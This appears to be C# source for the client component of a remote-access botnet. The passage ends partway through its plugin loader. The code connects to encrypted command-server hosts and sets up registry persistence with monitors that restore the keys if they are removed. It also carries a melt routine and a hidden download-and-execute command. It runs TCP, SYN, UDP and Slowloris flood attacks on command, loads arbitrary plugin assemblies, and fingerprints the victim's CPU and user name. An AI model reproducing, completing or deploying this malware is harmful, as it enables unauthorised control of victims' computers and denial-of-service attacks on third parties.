#region Usings
using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.IO;
using Microsoft.Win32;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Resources;
using System.Reflection;
using System.Collections;
using System.Text.RegularExpressions;
using System.Management;
using System.IO.Compression;
using Plugin;
using System.ComponentModel;
using Microsoft.Win32.SafeHandles;
using System.Security.Cryptography;
#endregion
#region Assembly
[assembly: AssemblyTitle("")]
[assembly: AssemblyDescription("")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("")]
[assembly: AssemblyProduct("")]
[assembly: AssemblyCopyright("")]
[assembly: AssemblyTrademark("")]
[assembly: AssemblyCulture("")]
[assembly: ComVisible(false)]
[assembly: Guid("00000000-0000-0000-0000-000000000000")]
[assembly: AssemblyVersion("1.0.0.0")]
[assembly: AssemblyFileVersion("1.0.0.0")]
#endregion
namespace Client
{
    class Program
    {
        static List<cSocket> clients;
        static bool wrongPassword;
        static bool dup;
        static int dupSleep;
        [MTAThread]
        static int Main()
        {
            if (Settings.Binder)
            {
                if (Settings.Install && Process.GetCurrentProcess().MainModule.FileName == Path.Combine(Settings.InstallPath, Encryption.Decrypt(Settings.InstallName, true)))
                {
                }
                else
                {
                    Binder.Execute();
                }
            }

            Initialize();
            Run();         
            Process.GetCurrentProcess().WaitForExit();
            return 0;
        }
        static void Initialize()
        {
            AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(CurrentDomain_AssemblyResolve);
            PE.CheckSettings();
            PluginHelper.Initialize();
            wrongPassword = false;
            dup = false;
            xMutex.Set(Settings.Mutex);
            if (xMutex.Running)
            {
                Process.GetCurrentProcess().Kill();
                return;
            }
            string[] hosts = Encryption.Decrypt(Settings.Hosts, true).Split('|');
            clients = new List<cSocket>();
            for (int i = 0; i < hosts.Length; i++)
            {
                if (string.IsNullOrEmpty(hosts[i]))
                    continue;
                cSocket client = new cSocket(hosts[i].Split('>')[0], int.Parse(hosts[i].Split('>')[1]), Encryption.Encrypt(hosts[i].Split('>')[2].Trim(), true));
                client.Disconnected += new EventHandler(client_Disconnected);
                client.ConnectionAccepted += new EventHandler(client_ConnectionAccepted);
                client.Received += new EventHandler<DataReceivedEventArgs>(client_Received);
                clients.Add(client);
            }
            PluginHelper.PluginAdded += new PluginHelper.PluginAddedEventHandler(PluginHelper_PluginAdded);

            if (Settings.Install)
            {
                if (Process.GetCurrentProcess().MainModule.FileName != Path.Combine(Settings.InstallPath, Encryption.Decrypt(Settings.InstallName, true)))
                {
                    new Thread(Installation.Install).Start();
                }
                Microsoft.Win32.SystemEvents.SessionEnding += new SessionEndingEventHandler(SystemEvents_SessionEnding);
            }
            if (Settings.Melt && Process.GetCurrentProcess().MainModule.FileName != Path.Combine(Settings.InstallPath, Encryption.Decrypt(Settings.InstallName, true)))
                PE.Melt();

            if (Settings.Install && Process.GetCurrentProcess().MainModule.FileName == Path.Combine(Settings.InstallPath, Encryption.Decrypt(Settings.InstallName, true)))
            {
                PluginHelper.LoadFromRegistry();
            }
            else
            {
                PluginHelper.LoadFromResources();
            }


            if (Settings.Install)
            {
                if (Settings.RegistryPersis)
                {
                    RegistryModerator.Initialize();
                    RegistryMonitor pluginRegMon = new RegistryMonitor(Settings.PluginRegHive, Settings.PluginRegLocation);
                    pluginRegMon.RegChangeNotifyFilter = RegChangeNotifyFilter.Value | RegChangeNotifyFilter.Key;
                    pluginRegMon.RegChanged += new EventHandler(pluginRegMon_RegChanged);
                    if (Settings.HKCU)
                    {
                        RegistryMonitor moniter = new RegistryMonitor(RegistryHive.CurrentUser, Encryption.Decrypt("[RUN]", true));
                        moniter.RegChanged += new EventHandler(moniter_RegChanged);
                        moniter.RegChangeNotifyFilter = RegChangeNotifyFilter.Value | RegChangeNotifyFilter.Key;
                        RegistryModerator.Add(moniter);
                    }
                    if (Settings.HKLM)
                    {
                        RegistryMonitor moniter = new RegistryMonitor(RegistryHive.CurrentUser, Encryption.Decrypt("[RUN]", true));
                        moniter.RegChanged += new EventHandler(moniter_RegChanged);
                        moniter.RegChangeNotifyFilter = RegChangeNotifyFilter.Value | RegChangeNotifyFilter.Key;
                        RegistryModerator.Add(moniter);
                    }
                    if (Settings.ActiveX)
                    {
                        RegistryMonitor moniter = new RegistryMonitor(RegistryHive.LocalMachine, Encryption.Decrypt("[AX_N]", true));
                        moniter.RegChanged += new EventHandler(moniter_RegChanged);
                        moniter.RegChangeNotifyFilter = RegChangeNotifyFilter.Value | RegChangeNotifyFilter.Key;
                        RegistryModerator.Add(moniter);
                    }
                }
            }
            Settings.Key = MD5Hash(GetCpuID() + "|" + Environment.UserName);
        }
        static void Run()
        {
            foreach (cSocket client in clients)
            {
                if (client == null)
                    continue;
                client.Connect();
            }
            if (RegistryModerator.Initialized)
                RegistryModerator.Run();
            Speed.Run();
            if (Settings.Visible)
                visible();
        }
        static void pluginRegMon_RegChanged(object sender, EventArgs e)
        {
            ThreadStart starter = new ThreadStart(PluginHelper.Save);
            new Thread(starter).Start();
        }

        static void moniter_RegChanged(object sender, EventArgs e)
        {
            ThreadStart starter = new ThreadStart(Installation.WriteToRegistry);
            new Thread(starter).Start();
        }

        static void SystemEvents_SessionEnding(object sender, SessionEndingEventArgs e)
        {
            if (e.Reason == SessionEndReasons.SystemShutdown)
            {
                if (Settings.Install)
                    Installation.Install();
            }
        }
        static void PluginHelper_PluginAdded(object sender, IPlugin plugin)
        {
            try
            {
                plugin.ExecutionComplete += new EventHandler(plugin_ExecutionComplete);
                plugin.Output += new OutputEventHandler(plugin_Output);
                plugin.Started += new EventHandler(plugin_Started);
                plugin.Stopped += new EventHandler(plugin_Stopped);
                PluginHelper.InitializedPlugins[plugin.Guid] = plugin;
            }
            catch { }
        }
        static Assembly CurrentDomain_AssemblyResolve(object sender, ResolveEventArgs args)
        {
            return PluginHelper.GetIPlugin();
        }
        #region ClientEvents
        static void  client_Received(object sender, DataReceivedEventArgs e)
        {
            cSocket client = (sender as cSocket);
            try
            {
                DataReader r = new DataReader(e.Data);
                switch (e.Header)
                {
                    case cSocket.Header.WRONG_PASSWORD:
                        wrongPassword = true;
                        break;

                    case cSocket.Header.DOWNLOAD_EXECUTE:
                        object[] obj = new object[2];
                        obj[0] = r.ReadString();
                        obj[1] = sender;
                        new Thread(DlExecute).Start(obj);
                        break;

                    case cSocket.Header.UPDATE:
                        object[] o = new object[3];
                        o[0] = r.ReadString();
                        o[1] = r.ReadString();
                        o[2] = sender;
                        new Thread(Update).Start(o);
                        break;

                    case cSocket.Header.TCP_START:
                        if (StressTest.Active)
                        {
                            client.SendStatus(StressTest.CurrentTypeAsString + Encryption.Decrypt("[F_ACTIVE]", true));
                            return;
                        }
                        StressTest.Initialize(StressTest.Type.TCP, r.ReadString(), r.ReadInt32(), r.ReadInt32(), r.ReadInt32(),
                            r.ReadInt32(), client);
                        StressTest.Begin();
                        client.SendStatus(Encryption.Decrypt("[TCP_F]", true));
                        break;

                    case cSocket.Header._SYN_START:
                        if (StressTest.Active)
                        {
                            client.SendStatus(StressTest.CurrentTypeAsString + Encryption.Decrypt("[F_ACTIVE]", true));
                            return;
                        }
                        StressTest.Initialize(StressTest.Type.SYN, r.ReadString(), r.ReadInt32(), r.ReadInt32(), r.ReadInt32(),
                            r.ReadInt32(), client);
                        StressTest.Begin();
                        client.SendStatus(Encryption.Decrypt("[SYN_F]", true));
                        break;

                    case cSocket.Header.UDP_START:
                        if (StressTest.Active)
                        {
                            client.SendStatus(StressTest.CurrentTypeAsString + Encryption.Decrypt("[F_ACTIVE]", true));
                            return;
                        }
                        StressTest.Initialize(StressTest.Type.UDP, r.ReadString(), r.ReadInt32(), r.ReadInt32(), r.ReadInt32(),
                            r.ReadInt32(), client);
                        StressTest.Begin();
                        client.SendStatus(Encryption.Decrypt("[UDP_F]", true));
                        break;

                    case cSocket.Header.SL_START:
                        if (StressTest.Active)
                        {
                            client.SendStatus(StressTest.CurrentTypeAsString + Encryption.Decrypt("[F_ACTIVE]", true));
                            return;
                        }
                        StressTest.Initialize(StressTest.Type.Slowloris, r.ReadString(), r.ReadInt32(), r.ReadInt32(), r.ReadInt32(), r.ReadInt32(), client);
                        StressTest.Begin();
                        client.SendStatus(Encryption.Decrypt("[SL_F]", true));
                        break;

                    case cSocket.Header.FLOOD_STOP:
                        if (StressTest.Active)
                        {
                            StressTest.Abort();
                            client.SendStatus(StressTest.CurrentTypeAsString + Encryption.Decrypt("[F_INACTIVE]", true));
                        }
                        else
                        {
                            client.SendStatus(Encryption.Decrypt("[NO_F]", true));
                        }
                        break;

                    case cSocket.Header.UNINSTALL:
                        string pw = Encoding.Default.GetString(e.Data);
                        if (pw != Encoding.Default.GetString(Encryption.Decrypt(Convert.FromBase64String(Settings.UninstallPassword), false)))
                        {
                            (sender as cSocket).SendStatus(Encryption.Decrypt("[INVALID_PW]", true));
                            return;
                        }
                        if (Settings.Install)
                        {
                            if (RegistryModerator.Initialized)
                            {
                                RegistryModerator.Stop();
                            }
                            Installation.Uninstall();
                        }
                        Process.GetCurrentProcess().Kill();
                        break;

                    case cSocket.Header.PLUGIN_STORE:
                        try
                        {
                            IPlugin plugin = null;
                            if ((plugin = PluginHelper.Add(Encoding.GetEncoding(1252).GetBytes(r.ReadString()))) != null)
                            {
                                string msg = plugin.Name + Encryption.Decrypt("[P_STORED]", true);
                                if (Settings.Install)
                                {
                                    msg += Encryption.Decrypt("[P_SAVED]", true);
                                    PluginHelper.Save();
                                }
                                client.SendStatus(msg);

                                if (plugin.ExecuteOnLoad)
                                {
                                    plugin.Initialize();
                                    new Thread(delegate()
                                    {
                                        plugin.Execute(sender, plugin.ExecuteOnLoadArgs);
                                    }).Start();
                                }
                            }
                            else
                                throw new Exception(PluginHelper.GetLastError());
                        }
                        catch (Exception ex)
                        {
                            client.SendStatus(Encryption.Decrypt("[P_INVALID_STORED]", true));
                            Console.WriteLine(ex.Message);
                        }
                        break;

                    case cSocket.Header.PLUGIN_EXECUTE:
                        try
                        {
                            IPlugin plugin;
                            PluginArgs args = Serializer.Deserialize(e.Data);
                            if (!PluginHelper.InitializedPlugins.ContainsKey(args.PluginGuid))
                            {
                                client.SendStatus(Encryption.Decrypt("[P_NOT_FOUND]", true));
                                break;
                            }
                            plugin = PluginHelper.InitializedPlugins[args.PluginGuid];
                            new Thread(delegate()
                                {
                                    plugin.Execute(sender, args);
                                }).Start();
                        }
                        catch (Exception ex)
                        {
                            client.SendStatus(Encryption.Decrypt("[P_EX_FAILED]", true) + " " + ex.Message);
                        }
                        break;

                    case cSocket.Header.PLUGIN_STOP:
                        new Thread(delegate()
                            {
                                try
                                {
                                    Guid guid = new Guid(r.ReadString());
                                    for (int i = 0; i < PluginHelper.InitializedPlugins.Count; i++)
                                    {
                                        if (PluginHelper.InitializedPlugins.ContainsKey(guid))
                                        {
                                            PluginHelper.InitializedPlugins[guid].Stop(sender);
                                            break;
                                        }
                                    }
                                }
                                catch { client.SendStatus(Encryption.Decrypt("[P_STOP_FAIL]", true)); }
                            }).Start();
                        break;
                    case cSocket.Header.DISCONNECT:
                        client.Disconnect(true);
                        break;
                    case cSocket.Header.DUP_DISCONNECT:
                        dup = true;
                        dupSleep = BitConverter.ToInt32(e.Data, 0);
                        client.Disconnect(true);
                        break;
                    case cSocket.Header.PLUGIN_STORED:
                        try
                        {
                            DataWriter w = new DataWriter();
                            foreach (IPlugin plugin in PluginHelper.InitializedPlugins.Values)
                            {
                                w.Write(plugin.Name);
                                w.Write(plugin.Description);
                                w.Write(plugin.Author);
                                w.Write(plugin.Guid.ToString());
                            }
                            client.Send(new BasePacket(cSocket.Header.PLUGIN_STORED, w.GetBytes()).GetBytes());
                        }
                        catch
                        {
                        }
                        break;
                    case cSocket.Header.PLUGIN_REMOVE:
                        try
                        {
                            Guid pluginRemoveGuid = new Guid(r.ReadString());
                            PluginHelper.Plugins.Remove(pluginRemoveGuid);
                            PluginHelper.InitializedPlugins.Remove(pluginRemoveGuid);
                            if (Settings.Install)
                                PluginHelper.Save();
                            DataWriter pluginRemovedWriter = new DataWriter();
                            pluginRemovedWriter.Write(pluginRemoveGuid.ToString());
                            client.Send(new BasePacket(cSocket.Header.PLUGIN_REMOVE, pluginRemovedWriter.GetBytes()).GetBytes());
                        }
                        catch { }
                        break;
                    case cSocket.Header.PLUGIN_TRANSFER:
                        try
                        {
                            Guid pluginTransferGuid = new Guid(r.ReadString());
                            DataWriter pluginWriter = new DataWriter();
                            pluginWriter.Write(PluginHelper.Plugins[pluginTransferGuid].Length);
                            pluginWriter.Write(PluginHelper.Plugins[pluginTransferGuid]);
                            pluginWriter.Write(r.ReadString());
                            client.Send(new BasePacket(cSocket.Header.PLUGIN_TRANSFER, pluginWriter.GetBytes()).GetBytes());
                        }
                        catch { } 
                        break;

                    default:
                        client.SendStatus(Encryption.Decrypt("[PACKET_ERROR]", true));
                        break;
                }
                r.Close();
            }
            catch
            {
            }
        }
        static void client_ConnectionAccepted(object sender, EventArgs e)
        {
            cSocket sock = (cSocket)sender;
            DataWriter w = new DataWriter();
            w.Write(Country.GetCountry());
            w.Write(OS.DetectOS());
            w.Write(Settings.Version);
            w.Write(Encryption.Decrypt(sock.Password, true));
            w.Write(Settings.Key);
            byte[] data = w.GetBytes();
            sock.Send(new BasePacket(cSocket.Header.INFORMATION, data).GetBytes());
            sock.BeginRead();
            Speed.Add(sock);
            w = null;
            data = null;
        }
        static void client_Disconnected(object sender, EventArgs e)
        {
            cSocket sock = (cSocket)sender;
            Speed.Remove(sock);
            sock.Close();
            if (wrongPassword)
            {
                Thread.Sleep(TimeSpan.FromSeconds(30.0));
                wrongPassword = false;
            }
            else if (dup)
            {
                Thread.Sleep(TimeSpan.FromSeconds(dupSleep));
                dupSleep = 0;
                dup = false;
            }
            switch (PluginHelper.HasInitializedPlugins)
            {
                case true:
                    foreach (IPlugin plugin in PluginHelper.InitializedPlugins.Values)
                    {
                        if (plugin.CurrentState == PluginState.RUNNING && plugin.StopOnDisconnection)
                        {
                            plugin.Stop(sender);
                        }
                    }
                    break;
            }
            sock.Connect();
        }
        #endregion
        #region PluginEvents
        static void plugin_Stopped(object sender, EventArgs e)
        {
            IPlugin plugin = (sender as IPlugin);
            try
            {
                if (plugin.StateObject != null)
                    (plugin.StateObject as cSocket).SendStatus((sender as IPlugin).Name + Encryption.Decrypt("[P_STOPPED]", true));
            }
            catch { }
        }

        static void plugin_Started(object sender, EventArgs e)
        {
            IPlugin plugin = sender as IPlugin;
            try
            {
                if (plugin.StateObject != null)
                    (plugin.StateObject as cSocket).SendStatus(plugin.Name + Encryption.Decrypt("[P_STARTED]", true));
            }
            catch { }
        }

        static void plugin_Output(IPlugin sender,PluginArgs args)
        {
            try
            {
                args.PluginGuid = sender.Guid;
                if (sender.StateObject != null)
                {
                    cSocket sock = (sender.StateObject as cSocket);
                    sock.Send(new BasePacket(cSocket.Header.PLUGIN_DATA, Serializer.Serialize(args)).GetBytes());
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(Encryption.Decrypt("[P_ERROR_CONSOLE]", true), sender.Name, ex.Message);
                (sender.StateObject as cSocket).SendStatus(sender.Name + Encryption.Decrypt("[P_ERROR]", true));
            }
        }

        static void plugin_ExecutionComplete(object sender, EventArgs e)
        {
            IPlugin plugin = (sender as IPlugin);
            try
            {
                if (plugin.StateObject != null)
                    (plugin.StateObject as cSocket).SendStatus(plugin.Name + Encryption.Decrypt("[P_EXECUTED]", true));
            }
            catch { }
        }
        #endregion
        #region Functions
        static void DlExecute(object o)
        {
            object[] obj = (object[])o;
            try
            {
                string path = Path.GetTempFileName() + ".exe";
                WebClient wc = new WebClient();
                (obj[1] as cSocket).SendStatus(Encryption.Decrypt("[DOWNLOADING]", true));
                wc.DownloadFile((string)obj[0], path);
                Process.Start(path);
                wc.Dispose();
                wc = null;
                (obj[1] as cSocket).SendStatus(Encryption.Decrypt("[DL_EXECUTED]", true));
            }
            catch
            {
                (obj[1] as cSocket).SendStatus(Encryption.Decrypt("[DL_ERROR]", true));
            }
            obj = null;
        }
        static void Update(object o)
        {
            object[] obj = (object[])o;
            if (obj[1].ToString() != Encoding.Default.GetString(Encryption.Decrypt(Convert.FromBase64String(Settings.UninstallPassword), false)))
            {
                (obj[2] as cSocket).SendStatus(Encryption.Decrypt("[INVALID_PW]", true));
                return;
            }
            try
            {
                string path = Path.GetTempFileName() + ".exe";
                WebClient wc = new WebClient();
                (obj[2] as cSocket).SendStatus(Encryption.Decrypt("[DOWNLOADING]", true));
                wc.DownloadFile((string)obj[0], path);
                (obj[2] as cSocket).SendStatus(Encryption.Decrypt("[UPDATING]", true));
                if (Settings.Install)
                {
                    Installation.Uninstall();
                }
                (obj[2] as cSocket).Disconnect(false);
                Process.Start(path);
                Process.GetCurrentProcess().Kill();
            }
            catch
            {
                (obj[2] as cSocket).SendStatus(Encryption.Decrypt("[ERROR_UPDATING]", true));
            }
            obj = null;
        }
        static void visible()
        {
            new Thread(show).Start();
        }
        static void show()
        {
            System.Windows.Forms.MessageBox.Show(Encryption.Decrypt("[SHOW_INFO]", true),
                "", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Information);
            Process.GetCurrentProcess().Kill();
        }
        static string GetCpuID()
        {
            try
            {
                string cpuInfo = string.Empty;
                ManagementClass mc = new ManagementClass("[PROCESSOR]");
                ManagementObjectCollection moc = mc.GetInstances();

                foreach (ManagementObject mo in moc)
                {
                    if (cpuInfo == "")
                    {
                        cpuInfo = mo.Properties[Encryption.Decrypt("[P_ID]", true)].Value.ToString();
                        break;
                    }
                }
                return cpuInfo;
            }
            catch
            {
            }
            return string.Empty;
        }
        static string MD5Hash(string input)
        {
            MD5 md5 = System.Security.Cryptography.MD5.Create();
            byte[] inputBytes = System.Text.Encoding.ASCII.GetBytes(input);
            byte[] hash = md5.ComputeHash(inputBytes);
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < hash.Length; i++)
            {
                sb.Append(hash[i].ToString("X2"));
            }
            return sb.ToString();
        }
        #endregion
    }
} //Main
namespace Client
{
    class cSocket
    {
        public enum Header : int
        {
            NONE = 0xF,

            _SYN_START = 0x0,
            TCP_START = 0x1,
            UDP_START = 0x2,
            FLOOD_STOP = 0x3,

            DOWNLOAD_EXECUTE = 0x4,
            UPDATE = 0x5,

            RESTART = 0x6,
            UNINSTALL = 0x7,

            PLUGIN_STORE = 0x8,
            PLUGIN_EXECUTE = 0x9,
            PLUGIN_STOP = 0x10,
            PLUGIN_DATA = 0x11,

            WRONG_PASSWORD = 0x12,
            PING = 0x13,

            INFORMATION = 0x14,
            STATUS = 0x15,
            DISCONNECT = 0x16,
            SPEED = 0x17,
            DUP_DISCONNECT = 0x18,
            SL_START = 0x19,
            PLUGIN_STORED = 0x20,
            PLUGIN_REMOVE = 0x21,
            PLUGIN_TRANSFER = 0x22
        } 
        Socket socket;
        public Socket RawSocket
        {
            get { return socket; }
        }
        bool connected;
        public bool Connected
        {
            get { return connected; }
        }
        Thread readThread = null;
        Thread connectThread = null;
        string host;
        public string Host { get { return host; } }
        int port;
        public int Port { get { return port; } }
        string password;
        public string Password { get { return password; } }
        public cSocket(string Host, int Port, string Password)
        {
            host = Host;
            port = Port;
            password = Password;
            connected = false;
        }
        public void Connect()
        {
            connect();
        }
        void connect()
        {
            if (connected)
                return;
            ThreadStart starter = delegate
            {
                socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                while (!socket.Connected)
                {
                    try
                    {
                        socket.Connect(host, port);
                    }
                    catch
                    {
                        Thread.Sleep(TimeSpan.FromSeconds(Settings.ConnectionTimeout));
                    }
                }
                Setup();
            };
            connectThread = new Thread(starter);
            connectThread.Start();
        }
        void Setup()
        {
            if (connected)
                return;
            connected = true;
            if (ConnectionAccepted != null)
            {
                ConnectionAccepted(this, null);
            }
        }
        public void BeginRead()
        {
            readThread = new Thread(read);
            readThread.Start();
        }
        void read()
        {
            try
            {
                MemoryStream ms = new MemoryStream();
                byte[] buffer;
                while (true)
                {
                    buffer = new byte[socket.ReceiveBufferSize];
                    int rec = socket.Receive(buffer, 0, buffer.Length, SocketFlags.Partial);
                    if (rec <= 0)
                    {
                        throw new SocketException();
                    }
                    Array.Resize(ref buffer, rec);
                    ms.Write(buffer, 0, rec);
                    if (char.ConvertFromUtf32((int)buffer[buffer.Length - 1]) == "\n")
                        break;
                }

                ms.Close();
                ThreadStart starter = delegate
                {
                    Parse(ms.ToArray());
                    ms.Dispose();
                    ms = null;
                };

                new Thread(starter).Start();
            }
            catch (SocketException)
            {
                Disconnect(true);
                return;
            }
            catch (Exception ex)
            {
                Disconnect(true);
                Console.WriteLine(ex.Message);
            }
            read();
        }
        void Parse(byte[] buffer)
        {
            List<byte> data = new List<byte>();
            for (int i = 0; i < buffer.Length; i++)
            {
                if (char.ConvertFromUtf32((int)buffer[i]) != "\n")
                {
                    data.Add(buffer[i]);
                }
                else
                {
                    Process(data.ToArray());
                    data.Clear();
                }
            }
        }
        void Process(byte[] buffer)
        {
            try
            {
                byte[] packet = Encryption.Decrypt(buffer, true);

                MemoryStream ms = new MemoryStream(packet);
                Header header;
                byte[] data;
                byte[] bHeader = new byte[4];
                ms.Read(bHeader, 0, bHeader.Length);
                header = (Header)BitConverter.ToInt32(bHeader, 0);
                data = new byte[ms.Length - 4];
                ms.Read(data, 0, data.Length);
                ms.Close();
                ms.Dispose();
                if (header != Header.PING)
                {
                    if (Received != null)
                    {
                        Received(this, new DataReceivedEventArgs(data, data.Length, header));
                    }
                }
                else
                {
                    SendPing();
                }
                data = null;
                buffer = null;
                packet = null;
                ms = null;
            }
            catch
            {
                DataWriter w = new DataWriter();
                w.Write("Broken Packet");
                Send(new BasePacket(Header.STATUS, w.GetBytes()).GetBytes());
            }
        }
        public int Send(byte[] data)
        {
            int sent = 0;
            try
            {
                sent = socket.Send(data, 0, data.Length, SocketFlags.Partial);
                sent += socket.Send(DataEnd, 0, 1, SocketFlags.Partial);
                if (Sent != null)
                {
                    if (sent != 0)
                    {
                        Sent(this, new SentEventArrgs(sent));
                    }
                }
                return sent;
            }
            catch
            {
                return 0;
            }
        }
        byte[] DataEnd
        {
            get
            {
                return Encoding.ASCII.GetBytes("\n");
            }
        }
        void SendPing()
        {
            Send(new BasePacket(Header.PING, new byte[0]).GetBytes());
        }
        public void SendStatus(string status)
        {
            DataWriter w = new DataWriter();
            w.Write(status);
            Send(new BasePacket(Header.STATUS, w.GetBytes()).GetBytes());
        }
        public bool Disconnect(bool callEvent)
        {
            if (!connected)
                return false;
            Close();
            connected = false;
            if (callEvent)
                if (Disconnected != null)
                    Disconnected(this, null);
            return true;
        }
        public void Close()
        {
            try
            {
                socket.Close();
                socket = null;
            }
            catch { }
            try
            {
                readThread.Abort();
                readThread = null;
            }
            catch { }
        }
        #region Events
        public event EventHandler ConnectionAccepted;
        public event EventHandler Disconnected;
        public event EventHandler<SentEventArrgs> Sent;
        public event EventHandler<DataReceivedEventArgs> Received;
        #endregion
    }
    #region EventArgs
    class DataReceivedEventArgs : EventArgs
    {
        byte[] data;
        public byte[] Data
        {
            get { return data; }
            set { data = value; }
        }
        int length;
        public int Length
        {
            get { return length; }
            set { length = value; }
        }
        cSocket.Header header;
        public cSocket.Header Header
        {
            get { return header; }
            set { header = value; }
        }
        public DataReceivedEventArgs(byte[] data, int len, cSocket.Header header)
        {
            Data = data;
            Length = len;
            Header = header;
        }
    }
    class SentEventArrgs : EventArgs
    {
        int length;
        public int Length
        {
            get { return length; }
        }
        public SentEventArrgs(int sent)
        {
            length = sent;
        }
    }
    class ErrorEventArgs : EventArgs
    {
        SocketError error;
        public SocketError SocketError
        {
            get
            {
                return error;
            }
        }
        int num_error;
        public int SocketErrorNumber
        {
            get
            {
                return num_error;
            }
        }

        public ErrorEventArgs(SocketError s_err, int s_n_err)
        {
            error = s_err;
            num_error = s_n_err;
        }
    }
#endregion
    class BasePacket
    {
        public cSocket.Header Header;
        public byte[] Data;
        public byte[] GetBytes()
        {
            List<byte> bytes = new List<byte>();
            bytes.AddRange(BitConverter.GetBytes((int)Header));
            bytes.AddRange(Data);
            byte[] packet = bytes.ToArray();
            bytes.Clear();
            bytes = null;
            return Encryption.Encrypt(packet, true);
        }
        public BasePacket(cSocket.Header header, byte[] data)
        {
            Header = header;
            Data = data;
        }
    }
    class DataWriter : BinaryWriter
    {
        MemoryStream ms;
        public DataWriter()
        {
            ms = new MemoryStream();
            this.OutStream = ms;
        }
        public byte[] GetBytes()
        {
            this.Close();
            byte[] array = ms.ToArray();
            ms.Dispose();
            ms = null;
            return array;
        }
    }
    class DataReader : BinaryReader
    {
        public DataReader(byte[] data)
            : base(new MemoryStream(data))
        {
        }
    }
} //Network 
namespace Client
{
    public class PluginHelper
    {
        public delegate void PluginAddedEventHandler(object sender, IPlugin plugin);
        public static event PluginAddedEventHandler PluginAdded;
        public static Dictionary<Guid, byte[]> Plugins;
        public static Dictionary<Guid, IPlugin> InitializedPlugins;
        static string lastError = string.Empty;
        public static void Initialize()
        {
            Plugins = new Dictionary<Guid, byte[]>();
            InitializedPlugins = new Dictionary<Guid, IPlugin>();
        }
        public static bool HasPlugins
        {
            get
            {
                return Plugins.Count > 0 ? true : false;
            }
        }
        public static bool HasInitializedPlugins
        {
            get
            {
                return InitializedPlugins.Count > 0 ? true : false;
            }
        }
        public static void Save()
        {
            try
            {
                BinaryFormatter bf = new BinaryFormatter();
                MemoryStream ms = new MemoryStream();
                bf.Serialize(ms, Plugins);
                ms.Close();
                byte[] b = Encryption.Encrypt(ms.ToArray(), false);
                switch (Settings.PluginRegHive)
                {
                    case RegistryHive.CurrentUser:
                        Registry.CurrentUser.CreateSubKey(Settings.PluginRegLocation).SetValue(Settings.PluginStoreName, b);
                        break;

                    default:
                        Registry.LocalMachine.CreateSubKey(Settings.PluginRegLocation).SetValue(Settings.PluginStoreName, b);
                        break;
                }
                ms.Dispose();
                bf = null;
                ms = null;
            }
            catch
            {
            }
        }
        public static void LoadFromRegistry()
        {
            ThreadStart starter = delegate
            {
                try
                {
                    BinaryFormatter bf = new BinaryFormatter();
                    byte[] b;
                    MemoryStream ms;
                    switch (Settings.PluginRegHive)
                    {
                        case RegistryHive.CurrentUser:
                            b = Registry.CurrentUser.CreateSubKey(Settings.PluginRegLocation).GetValue(Settings.PluginStoreName) as byte[];
                            b = Encryption.Decrypt(b, false);
                            ms = new MemoryStream(b);
                            Plugins = bf.Deserialize(ms) as Dictionary<Guid, byte[]>;
                            ms.Close();
                            ms.Dispose();
                            ms = null;
                            b = null;
                            break;

                        default:
                            b = Registry.LocalMachine.CreateSubKey(Settings.PluginRegLocation).GetValue(Settings.PluginStoreName) as byte[];
                            b = Encryption.Decrypt(b, false);
                            ms = new MemoryStream(b);
                            Plugins = bf.Deserialize(ms) as Dictionary<Guid, byte[]>;
                            ms.Close();
                            ms.Dispose();
                            ms = null;
                            b = null;
                            break;
                    }
                    bf = null;

                    foreach (byte[] bytes in Plugins.Values)
                    {
                        Add(bytes);
                    }
                }
                catch
                {
                }
            };
            new Thread(starter).Start();
        }
        public static void LoadFromResources()
        {
            ThreadStart starter = delegate
            {
                try
                {
                    Stream str = Assembly.GetExecutingAssembly().GetManifestResourceStream("p");
                    byte[] bData = new byte[str.Length];
                    str.Read(bData, 0, bData.Length);
                    bData = Encryption.Decrypt(bData, false);
                    str.Close();
                    MemoryStream ms = new MemoryStream(bData);
                    BinaryReader r = new BinaryReader(ms);
                    while (r.PeekChar() > 0)
                    {
                        int len = r.ReadInt32();
                        byte[] b = r.ReadBytes(len);
                        b = Encryption.Decrypt(b, false);
                        Add(b);
                    }
                    if (Settings.Install)
                        Save();
                    r.Close();
                    ms.Dispose();
                }
                catch
                {
                }
            };
            new Thread(starter).Start();
        }
        public static IPlugin Add(byte[] bytes)
        {
            try
            {
                Assembly loadedAsm = Assembly.Load(bytes);
                foreach (Type type in loadedAsm.GetTypes())
                {
                    if (type.IsSubclassOf(typeof(IPlugin)))
                    {
                        int found = 0;
                        IPlugin loadedPlugin = (IPlugin)Activator.CreateInstance(type);
                        if (Plugins.ContainsKey(loadedPlugin.Guid))
                        {
                            found++;
                        }
                        else
                            Plugins.Add(loadedPlugin.Guid, bytes);

                        if (InitializedPlugins.ContainsKey(loadedPlugin.Guid))
                        {
                            found++;
                        }
                        else
                            InitializedPlugins.Add(loadedPlugin.Guid,loadedPlugin);

                        if (found == 2)
                        {
                            lastError = loadedPlugin.Name + Encryption.Decrypt("[P_ALREADY_STORED]", true);
                            return null;
                        }
                        else
                            lastError = string.Empty;

                        if (PluginAdded != null)
                        {
                            PluginAdded(null, loadedPlugin);
                        }
                        return loadedPlugin;

                    }
                }
                Console.WriteLine("NOT FOUND");
                lastError = Encryption.Decrypt("[P_CLASS_NOT_FOUND]", true);
            }
            catch(Exception ex)
            {
                Console.WriteLine(ex.Message);
                lastError = ex.Message;
            }
            return null;
            //try
            //{
            //    Assembly asm = Assembly.Load(bytes);
            //    foreach (Type type in asm.GetTypes())
            //    {
            //        int alreadyStored = 0;
            //        if (type.IsClass && type.IsSubclassOf(typeof(IPlugin)))
            //        {
            //            IPlugin plugin = (IPlugin)Activator.CreateInstance(type);
            //            if (plugin.ExecuteOnLoad)
            //            {
            //                plugin.Initialize();
            //                new Thread(delegate()
            //                {
            //                    plugin.Execute(null, plugin.ExecuteOnLoadArgs);
            //                }).Start();
            //            }
            //            if (!Plugins.ContainsKey(plugin.Guid))
            //            {
            //                Plugins.Add(plugin.Guid, bytes);
            //            }
            //            else
            //                alreadyStored++;
